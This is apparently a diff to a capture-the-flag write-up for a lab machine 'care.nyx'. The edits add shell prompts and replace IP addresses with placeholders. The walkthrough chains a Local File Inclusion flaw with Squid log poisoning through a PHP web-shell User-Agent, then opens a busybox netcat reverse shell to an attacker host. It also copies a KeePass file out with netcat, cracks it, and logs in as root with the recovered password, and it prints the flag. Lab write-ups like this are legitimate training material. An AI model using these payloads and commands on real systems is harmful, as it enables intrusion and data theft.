@@ -19,7 +19,7 @@ A Local File Inclusion vulnerability in `page.php` is chained with the Squid pro
 A full TCP port scan is run first:
 
 ```bash
-sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn care.nyx
+$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn care.nyx
 
 PORT     STATE SERVICE     REASON
 22/tcp   open  ssh         syn-ack ttl 64
@@ -31,11 +31,11 @@ MAC Address: 08:00:27:95:F3:C9 (Oracle VirtualBox virtual NIC)
 Three ports are found open: **22 (SSH)**, **80 (HTTP)**, and **3128**, the default port for the Squid proxy. A version/script scan against all three fills in the details:
 
 ```bash
-sudo nmap -p 22,80,3128 -sCV care.nyx
+$ sudo nmap -p 22,80,3128 -sCV care.nyx
 
 PORT     STATE SERVICE    VERSION
 22/tcp   open  ssh        OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
 |_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
 80/tcp   open  http       Apache httpd 2.4.62 ((Debian))
@@ -64,7 +64,7 @@ http://care.nyx
 A content discovery scan turns up a page worth a closer look:
 
 ```bash
-ffuf -u http://care.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt,.zip -ic
+$ ffuf -u http://care.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt,.zip -ic
 
 contact.html          [Status: 200, Size: 8480, Words: 773, Lines: 193, Duration: 4ms]
 about.html            [Status: 200, Size: 13709, Words: 343, Lines: 5ms]
@@ -94,7 +94,7 @@ server-status         [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 7
 The `i` parameter looks like it's including a file. `ffuf` is used with a dedicated LFI wordlist to see which payloads produce a different response than the baseline:
 
 ```bash
-ffuf -u 'http://care.nyx/page.php?i=FUZZ' -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 7
+$ ffuf -u 'http://care.nyx/page.php?i=FUZZ' -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 7
 
 /etc/passwd            [Status: 200, Size: 1060, Words: 5, Lines: 23, Duration: 23ms]
 :: Progress: [930/930] :: Job [1/1] :: 930/930] :: Job [1/1] :: 293 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
@@ -127,29 +127,29 @@ http://care.nyx/page.php?i=/var/log/squid/access.log
 The Squid access log is the one that gets used. A request is sent *through* the Squid proxy itself, with the User-Agent header set to a PHP web shell one-liner:
 
 ```bash
-curl -sX GET --proxy "http://care.nyx:3128" "http://127.0.0.1:80" -A '<?php system($_GET["cmd"]); ?>'
+$ curl -sX GET --proxy "http://care.nyx:3128" "http://127.0.0.1:80" -A '<?php system($_GET["cmd"]); ?>'
 ```
 
 Squid logs every proxied request, User-Agent included — so that PHP snippet now sits inside `/var/log/squid/access.log` as plain text. Including that log file through the LFI is enough to get it interpreted as PHP, since `include()` executes whatever valid PHP it finds regardless of the file's name or extension:
 
 ```bash
-curl -sX GET "http://care.nyx/page.php?i=/var/log/squid/access.log&cmd=id" | tail -n 2
-10.0.2.15 [17/Jul/2026:16:06:23 +0200] "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
+$ curl -sX GET "http://care.nyx/page.php?i=/var/log/squid/access.log&cmd=id" | tail -n 2
+<ATTACKER_IP> [17/Jul/2026:16:06:23 +0200] "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
 ```
 
 With arbitrary command execution confirmed, the same technique is used to trigger a reverse shell. The payload is URL-encoded first, since it needs to survive as a query string value:
 
 ```bash
-echo -n 'busybox nc 10.0.2.15 9001 -e /bin/sh' | jq -sRr @uri
-curl -sX GET "http://care.nyx/page.php?i=/var/log/squid/access.log&cmd=busybox%20nc%2010.0.2.15%209001%20-e%20%2Fbin%2Fsh"
+$ echo -n 'busybox nc <ATTACKER_IP> <PORT> -e /bin/sh' | jq -sRr @uri
+$ curl -sX GET "http://care.nyx/page.php?i=/var/log/squid/access.log&cmd=busybox%20nc%20<ATTACKER_IP>%20<PORT>%20-e%20%2Fbin%2Fsh"
 ```
 
 A listener catches the callback:
 
 ```bash
-nc -nlvp 9001
-listening on [any] 9001 ...
-connect to [10.0.2.15] from (UNKNOWN) [10.0.2.44] 53438
+$ nc -nlvp <PORT>
+listening on [any] <PORT> ...
+connect to [<ATTACKER_IP>] from (UNKNOWN) [care.nyx] 53438
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
@@ -237,22 +237,22 @@ dorian@care:~$ file /home/dorian/.bak/data.txt
 
 ```bash
 # Attacker machine
-nc -lvp 9005 > data.txt
+$ nc -lvp <PORT> > data.txt
 
 # Victim machine
-nc 10.0.2.15 9005 < /home/dorian/.bak/data.txt
+nc <ATTACKER_IP> <PORT> < /home/dorian/.bak/data.txt
 ```
 
 With the file renamed to its real extension, its password hash is extracted and cracked:
 
 ```bash
-cp data.txt data.kdbx
-keepass2john data.kdbx > data_hash
-wget --no-check-certificate -q "https://raw.githubusercontent.com/d4t4s3c/KDBXcrack/refs/heads/main/KDBXcrack" && chmod +x KDBXcrack
-./KDBXcrack -f data.kdbx -w /usr/share/wordlists/rockyou.txt
+$ cp data.txt data.kdbx
+$ keepass2john data.kdbx > data_hash
+$ wget --no-check-certificate -q "https://raw.githubusercontent.com/d4t4s3c/KDBXcrack/refs/heads/main/KDBXcrack" && chmod +x KDBXcrack
+$ ./KDBXcrack -f data.kdbx -w /usr/share/wordlists/rockyou.txt
 
-╭╮╭━┳━━━┳━━╮╭━╮╭━╮           ╭╮  
-┃┃┃╭┻╮╭╮┃╭╮┃╰╮╰╯╭╯           ┃┃  
+╭╮╭━┳━━━┳━━╮╭━╮╭━╮           ╭╮
+┃┃┃╭┻╮╭╮┃╭╮┃╰╮╰╯╭╯           ┃┃
 ┃╰╯╯ ┃┃┃┃╰╯╰╮╰╮╭╯ ╭━━┳━┳━━┳━━┫┃╭╮
 ┃╭╮┃ ┃┃┃┃╭━╮┃╭╯╰╮ ┃╭━┫╭┫╭╮┃╭━┫╰╯╯
 ┃┃┃╰┳╯╰╯┃╰━╯┣╯╭╮╰╮┃╰━┫┃┃╭╮┃╰━┫╭╮╮
@@ -272,7 +272,7 @@ wget --no-check-certificate -q "https://raw.githubusercontent.com/d4t4s3c/KDBXcr
 The database opens with that password and holds a set of SSH credentials:
 
 ```bash
-keepassxc
+$ keepassxc
 ```
 <img src="..\Images\care\Pasted image 20260717162523.png"/>
 <img src="..\Images\care\Pasted image 20260717162636.png"/>
@@ -286,7 +286,7 @@ keepassxc
 Rather than a local exploit, escalation here comes from valid credentials recovered from the vault. They're validated against SSH first:
 
 ```bash
-hydra -l 'root' -p 'r00tB0$$123!' ssh://care.nyx
+$ hydra -l 'root' -p 'r00tB0$$123!' ssh://care.nyx
 
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
 [DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
@@ -299,13 +299,13 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-17 10:27:
 They check out, and root is reached directly:
 
 ```bash
-ssh root@care.nyx
+$ ssh root@care.nyx
 root@care.nyx's password:
 root@care:~# id
-uid=0(root) gid=0(root) grupos=0(root)
+uid=0(root) gid=0(root) groups=0(root)
 root@care:~# ls -l /root
 total 4
--r-------- 1 root root 33 oct  2  2025 root.txt
+-r-------- 1 root root 33 Oct  2  2025 root.txt
 root@care:~# cat /root/root.txt
 3ba0b1d7e2e14ffd1f5b9788aa957bfd
 ```
